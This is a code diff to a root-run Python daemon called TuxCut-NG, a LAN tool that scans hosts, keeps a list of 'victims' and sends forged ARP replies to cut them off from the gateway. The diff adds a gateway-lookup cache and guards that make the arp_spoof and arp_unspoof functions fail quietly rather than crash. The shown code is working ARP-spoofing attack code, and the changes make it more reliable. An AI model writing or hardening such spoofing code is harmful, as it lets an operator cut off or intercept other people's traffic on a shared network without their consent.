@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """TuxCut-NG v1.3.1 — Server daemon (run as root via systemd)"""
 
-import sys, os, json, atexit, re, socket, subprocess, random, logging
+import sys, os, json, atexit, re, socket, subprocess, random, logging, time
 from pathlib import Path
 from setproctitle import setproctitle
 from bottle import route, run, request, response
@@ -21,6 +21,10 @@ logger.addHandler(fh)
 
 victims = []
 
+_gw_cache      = {}
+_gw_cache_time = 0.0
+GW_CACHE_TTL   = 30  # ثانية
+
 # ── Network helpers ───────────────────────────────────────────────────
 
 def get_hostname(ip):
@@ -29,18 +33,26 @@ def get_hostname(ip):
     except Exception:
         return ''
 
-def get_default_gw():
+def get_default_gw(force=False):
+    global _gw_cache, _gw_cache_time
+    now = time.time()
+    if not force and _gw_cache and (now - _gw_cache_time) < GW_CACHE_TTL:
+        return _gw_cache
     out = subprocess.run(['ip', 'route', 'show', 'default'],
                          capture_output=True, text=True).stdout
     m = re.search(r'default via (\S+) dev (\S+)', out)
     if not m:
+        _gw_cache = {}
+        _gw_cache_time = now
         return {}
     gw_ip, iface = m.group(1), m.group(2)
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gw_ip),
                  timeout=3, verbose=False)
     gw_mac = ans[0][1].hwsrc if ans else ''
-    return {'ip': gw_ip, 'mac': gw_mac, 'iface': iface,
-            'hostname': get_hostname(gw_ip)}
+    _gw_cache = {'ip': gw_ip, 'mac': gw_mac, 'iface': iface,
+                 'hostname': get_hostname(gw_ip)}
+    _gw_cache_time = now
+    return _gw_cache
 
 def get_my(iface):
     return {'ip':       get_if_addr(iface),
@@ -55,6 +67,8 @@ def disable_ip_forward():
 
 def arp_spoof(victim):
     gw = get_default_gw()
+    if not gw or not gw.get('iface') or not gw.get('mac'):
+        return
     my = get_my(gw['iface'])
     send(ARP(op=2, psrc=gw['ip'],     hwsrc=my['mac'],
              pdst=victim['ip'],        hwdst=victim['mac']),
@@ -65,6 +79,8 @@ def arp_spoof(victim):
 
 def arp_unspoof(victim):
     gw = get_default_gw()
+    if not gw or not gw.get('mac') or not victim.get('mac'):
+        return
     send(ARP(op=2, psrc=gw['ip'],     hwsrc=gw['mac'],
              pdst=victim['ip'],        hwdst=victim['mac']),
          count=10, verbose=False)
@@ -124,7 +140,7 @@ def my(iface):
 def scan(gw_ip):
     hosts = []
     ans, _ = arping(f'{gw_ip}/24', verbose=False)
-    for _, r in ans:
+    for _, r in ans or []:
         hosts.append({'ip': r.psrc, 'mac': r.hwsrc,
                       'hostname': get_hostname(r.psrc)})
     return json_response({'result': {'status': 'success', 'hosts': hosts}})
